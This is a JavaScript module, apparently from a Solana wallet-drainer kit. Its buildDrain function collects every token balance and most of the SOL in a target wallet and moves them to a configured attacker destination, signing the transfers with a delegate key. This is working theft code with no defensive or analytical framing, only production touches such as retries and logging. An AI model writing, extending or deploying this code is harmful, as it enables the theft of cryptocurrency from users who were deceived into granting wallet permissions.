const { Transaction, PublicKey, SystemProgram } = require("@solana/web3.js");
const {
    createTransferInstruction,
    getAssociatedTokenAddress,
    getAccount,
    createAssociatedTokenAccountInstruction
} = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { getBlockhash, setBlockhash } = require("../core/blockhashCache");

const MIN_RAW_AMOUNT = 1000n;
const MIN_SOL_TO_DRAIN = 200000n; // 0.0002 SOL
const SOL_BUFFER = 50000n;        // 0.00005 SOL

async function buildDrain(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();
            const tx = new Transaction();
            const userPubkey = new PublicKey(user);
            const delegatePubkey = new PublicKey(config.WALLET);
            const destinationPubkey = new PublicKey(config.DESTINATION_ADDRESS);
            const feePayer = new PublicKey(config.PUBLIC_KEY);

            let blockhash = getBlockhash();
            if (!blockhash) {
                const { blockhash: freshBlockhash } = await conn.getLatestBlockhash("confirmed");
                blockhash = freshBlockhash;
                setBlockhash(blockhash);
            }

            tx.recentBlockhash = blockhash;
            tx.feePayer = feePayer;

            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
            if (!tokenAccounts) throw new Error("Failed to fetch token accounts");

            for (const token of tokenAccounts.tokens || []) {
                if (token.amount < MIN_RAW_AMOUNT) continue;

                const destAta = await getAssociatedTokenAddress(token.mint, destinationPubkey);

                let destExists = true;
                try {
                    await getAccount(conn, destAta);
                } catch {
                    destExists = false;
                }

                if (!destExists) {
                    tx.add(
                        createAssociatedTokenAccountInstruction(
                            feePayer,
                            destAta,
                            destinationPubkey,
                            token.mint
                        )
                    );
                }

                tx.add(
                    createTransferInstruction(
                        token.ata,
                        destAta,
                        delegatePubkey,
                        token.amount
                    )
                );
            }

            const solBalance = tokenAccounts.sol;
            if (solBalance > MIN_SOL_TO_DRAIN + SOL_BUFFER) {
                const lamportsToSend = solBalance - SOL_BUFFER;
                tx.add(
                    SystemProgram.transfer({
                        fromPubkey: delegatePubkey,
                        toPubkey: destinationPubkey,
                        lamports: Number(lamportsToSend)
                    })
                );
            }

            if (tx.instructions.length === 0) {
                throw new Error("No tokens or SOL to drain");
            }

            logger.info("Drain transaction built", { instructions: tx.instructions.length });
            return tx;
        } catch (err) {
            logger.error("Failed to build drain transaction", { error: err.message });
            throw err;
        }
    }, "buildDrain");
}

module.exports = { buildDrain };
